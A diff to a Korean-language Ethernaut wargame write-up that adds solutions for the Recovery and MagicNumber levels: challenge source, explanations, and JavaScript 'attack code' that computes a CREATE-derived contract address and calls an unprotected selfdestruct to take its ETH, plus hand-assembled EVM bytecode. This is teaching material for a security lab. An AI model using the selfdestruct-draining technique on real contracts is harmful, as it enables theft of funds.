@@ -379,7 +379,6 @@ await contract.consecutiveWins()
 ### 정리
 
 블록 해시, 타임스탬프 같은 온체인 값은 난수로 쓰면 안 된다. 모든 참여자가 같은 값을 읽고 같은 결과를 미리 계산할 수 있다.
-
 </section>
 <section class="ethernaut-page" data-ethernaut-page data-level-title="Telephone" markdown="1">
 
@@ -1823,7 +1822,7 @@ await contract.owner()
 
 ### 문제 요약
 
-작성 예정.
+생성된 `SimpleToken` 컨트랙트 주소를 찾아서 남아 있는 ETH를 회수하면 클리어된다. 문제는 토큰 컨트랙트 주소를 잃어버렸지만, 컨트랙트 생성 주소는 계산할 수 있다는 점이다.
 
 ### 핵심
 
@@ -1834,22 +1833,115 @@ await contract.owner()
 ### 소스코드
 
 ```solidity
-// 작성 예정
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.0;
+
+contract Recovery {
+    //generate tokens
+    function generateToken(string memory _name, uint256 _initialSupply) public {
+        new SimpleToken(_name, msg.sender, _initialSupply);
+    }
+}
+
+contract SimpleToken {
+    string public name;
+    mapping(address => uint256) public balances;
+
+    // constructor
+    constructor(string memory _name, address _creator, uint256 _initialSupply) {
+        name = _name;
+        balances[_creator] = _initialSupply;
+    }
+
+    // collect ether in return for tokens
+    receive() external payable {
+        balances[msg.sender] = msg.value * 10;
+    }
+
+    // allow transfers of tokens
+    function transfer(address _to, uint256 _amount) public {
+        require(balances[msg.sender] >= _amount);
+        balances[msg.sender] = balances[msg.sender] - _amount;
+        balances[_to] = _amount;
+    }
+
+    // clean up after ourselves
+    function destroy(address payable _to) public {
+        selfdestruct(_to);
+    }
+}
 ```
 
 ### 풀이
 
-작성 예정.
+`Recovery.generateToken()`은 `new SimpleToken(...)`으로 토큰 컨트랙트를 만든다.
+
+```solidity
+new SimpleToken(_name, msg.sender, _initialSupply);
+```
+
+Ethereum에서 `CREATE`로 만들어지는 컨트랙트 주소는 랜덤이 아니다. 생성자 주소와 nonce로 결정된다.
+
+```text
+address = last20bytes(keccak256(rlp([creator, nonce])))
+```
+
+여기서 creator는 `Recovery` 인스턴스 주소다. Ethernaut 인스턴스에서 `generateToken()`으로 `SimpleToken`을 한 번 만들었으므로 보통 nonce는 `1`이다.
+
+즉 `Recovery` 인스턴스 주소와 nonce `1`로 `SimpleToken` 주소를 계산할 수 있다.
+주소를 찾은 뒤에는 `SimpleToken.destroy()`를 호출하면 된다.
+
+```solidity
+function destroy(address payable _to) public {
+    selfdestruct(_to);
+}
+```
+
+`destroy()`에는 접근 제어가 없다. 누구나 호출 가능하다. `_to`에는 내 지갑 주소를 넣어 SimpleToken에 남은 ETH를 회수한다.
 
 ### 공격 코드
 
 ```javascript
-// 작성 예정
+const recoveryAddress = contract.address;
+const nonce = 1;
+
+const tokenAddress = web3.utils.toChecksumAddress(
+  "0x" + web3.utils
+    .sha3(`0xd694${recoveryAddress.slice(2)}0${nonce}`)
+    .slice(-40)
+);
+
+const token = await new web3.eth.Contract([
+  {
+    inputs: [{ name: "_to", type: "address" }],
+    name: "destroy",
+    outputs: [],
+    stateMutability: "nonpayable",
+    type: "function"
+  }
+], tokenAddress);
+
+await token.methods.destroy(player).send({ from: player });
 ```
+
+주소만 따로 확인하려면:
+
+```javascript
+tokenAddress
+```
+
+`SimpleToken` 잔액 확인:
+
+```javascript
+await getBalance(tokenAddress)
+```
+
+`destroy()` 호출 후 잔액이 `0`이면 인스턴스를 제출하면 된다.
 
 ### 정리
 
-작성 예정.
+컨트랙트 주소는 숨겨진 값이 아니다. `CREATE`로 배포된 컨트랙트 주소는 생성자 주소와 nonce로 계산할 수 있다.
+주소를 찾은 뒤 접근 제어가 없는 `destroy()`를 호출하면 ETH를 회수할 수 있다.
 
 </section>
 <section class="ethernaut-page" data-ethernaut-page data-level-title="MagicNumber" markdown="1">
@@ -1858,7 +1950,7 @@ await contract.owner()
 
 ### 문제 요약
 
-작성 예정.
+`whatIsTheMeaningOfLife()`를 호출했을 때 `42`를 반환하는 solver 컨트랙트를 등록하면 클리어된다. 단, solver의 런타임 코드는 매우 작게 만들어야 한다.
 
 ### 핵심
 
@@ -1869,22 +1961,105 @@ await contract.owner()
 ### 소스코드
 
 ```solidity
-// 작성 예정
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.0;
+
+contract MagicNum {
+    address public solver;
+
+    constructor() {}
+
+    function setSolver(address _solver) public {
+        solver = _solver;
+    }
+
+    /*
+    ____________/\\\_______/\\\\\\\\\_____        
+     __________/\\\\\_____/\\\///////\\\___       
+      ________/\\\/\\\____\///______\//\\\__      
+       ______/\\\/\/\\\______________/\\\/___     
+        ____/\\\/__\/\\\___________/\\\//_____    
+         __/\\\\\\\\\\\\\\\\_____/\\\//________   
+          _\///////////\\\//____/\\\/___________  
+           ___________\/\\\_____/\\\\\\\\\\\\\\\_ 
+            ___________\///_____\///////////////__
+    */
+}
 ```
 
 ### 풀이
 
-작성 예정.
+이 문제는 Solidity 코드로 일반 컨트랙트를 작성하는 방식보다 EVM bytecode를 직접 만드는 방식이 맞다.
+
+목표는 solver 주소에 있는 컨트랙트가 다음 호출에 대해 `42`를 반환하게 만드는 것이다.
+
+```solidity
+whatIsTheMeaningOfLife()
+```
+
+함수 selector 검사는 없다. 어떤 calldata가 오든 32바이트 값 `42`를 반환하면 된다.
+
+런타임 코드는 다음 동작만 하면 된다.
+
+1. 메모리 `0x00` 위치에 `0x2a`를 저장한다.
+2. 메모리 `0x00`부터 32바이트를 반환한다.
+
+EVM opcode로 쓰면 다음과 같다.
+
+```text
+602a60005260206000f3
+```
+
+분해하면:
+
+- `60 2a`: `PUSH1 0x2a`
+- `60 00`: `PUSH1 0x00`
+- `52`: `MSTORE`
+- `60 20`: `PUSH1 0x20`
+- `60 00`: `PUSH1 0x00`
+- `f3`: `RETURN`
+
+이건 런타임 코드다. 배포할 때는 이 런타임 코드를 체인에 저장하는 creation code가 필요하다.
+
+```text
+600a600c600039600a6000f3
+```
+
+전체 배포 바이트코드는 creation code와 runtime code를 이어 붙인 값이다.
 
 ### 공격 코드
 
-```text
-// 작성 예정
+```javascript
+const bytecode = "0x600a600c600039600a6000f3602a60005260206000f3";
+
+const receipt = await web3.eth.sendTransaction({
+  from: player,
+  data: bytecode
+});
+
+await contract.setSolver(receipt.contractAddress);
 ```
+
+solver 주소 확인:
+
+```javascript
+await contract.solver()
+```
+
+등록된 solver가 실제로 `42`를 반환하는지 확인하려면 직접 call을 날린다.
+
+```javascript
+await web3.eth.call({
+  to: await contract.solver(),
+  data: web3.eth.abi.encodeFunctionSignature("whatIsTheMeaningOfLife()")
+})
+```
+
+반환값 끝이 `2a`면 `42`다.
 
 ### 정리
 
-작성 예정.
+EVM 컨트랙트는 Solidity 없이도 bytecode만으로 배포할 수 있다. 이 문제의 solver는 어떤 calldata가 와도 메모리에 `42`를 쓰고 32바이트로 반환하는 최소 런타임 코드면 충분하다.
 
 </section>
 <section class="ethernaut-page" data-ethernaut-page data-level-title="Alien Codex" markdown="1">
